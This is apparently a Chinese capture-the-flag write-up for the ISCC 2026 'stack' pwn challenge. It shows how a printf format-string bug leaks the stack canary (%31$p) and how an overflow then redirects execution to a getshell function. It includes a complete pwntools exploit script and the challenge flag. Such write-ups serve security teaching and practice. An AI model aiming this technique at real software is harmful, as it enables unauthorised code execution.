---
title: "ISCC 2026 pwn stack"
published: 2026-05-06T22:10:00+08:00
description: "记录 ISCC 2026 stack 题的格式化字符串泄露 canary 与栈溢出利用过程。"
image: ""
tags: ["ISCC_2026", "Pwn", "Format String", "Stack Overflow"]
category: "ISCC_2026"
categoryPath: ["ISCC_2026", "pwn"]
series: "ISCC_2026"
draft: false
lang: "zh_CN"
---

附件：[`attachment`](/attachments/iscc_2026/pwn/stack/attachment)

题目概览：
![题目概览](/attachments/iscc_2026/pwn/stack/01-overview.png)

漏洞点很直接：

- 栈溢出，但是开了 canary，需要先泄露
- `printf(buf)` 存在格式化字符串漏洞，可以拿来找偏移并泄露 canary

漏洞位置：
![漏洞位置](/attachments/iscc_2026/pwn/stack/02-vuln.png)

先用格式化字符串测偏移：

![偏移测试 1](/attachments/iscc_2026/pwn/stack/03-offset-1.png)

![偏移测试 2](/attachments/iscc_2026/pwn/stack/04-offset-2.png)

可以看到 `0x41414141`，也就是 `AAAA`，对应偏移是 `6`。

接着结合调用点计算 canary 所在参数位置。调用点如下：

![调用点](/attachments/iscc_2026/pwn/stack/06-callsite.png)

计算过程：

```text
0xC (sub) + 0x4 (push) + 0x4 (call 返回地址) = 0x14
0x14 + 0x70 = 0x84
0x84 - 0x0c = 0x78
0x78 / 4 = 30
```

因此 canary 对应第 `31` 个参数，也就是：

```text
%31$p
```

利用思路分两步：

1. 第一轮发送 `b'AA%31$pBB\x00'`，泄露 canary
2. 第二轮构造溢出，带上正确 canary，覆盖返回地址到 `getshell`

拿到 shell 后得到 flag：

![利用结果](/attachments/iscc_2026/pwn/stack/05-flag.png)

Exp：

```python
from pwn import *

context.arch = "i386"
context.os = "linux"

elf = ELF("./attachment")

def start():
    if args.REMOTE:
        return remote("HOST", PORT)
    return process("./attachment")

io = start()
getshell = 0x080491C6

io.recvuntil(b"Hello Hacker!\n")

io.send(b"AA%31$pBB\x00")
io.recvuntil(b"AA")
canary = int(io.recvuntil(b"BB", drop=True), 16)
log.success(f"canary = {hex(canary)}")

payload  = b"A" * 0x64
payload += p32(canary)
payload += b"B" * 8
payload += b"CCCC"
payload += p32(getshell)

io.send(payload)
io.interactive()
```

flag：`ISCC{ni_cai_flag_shi_sha}`
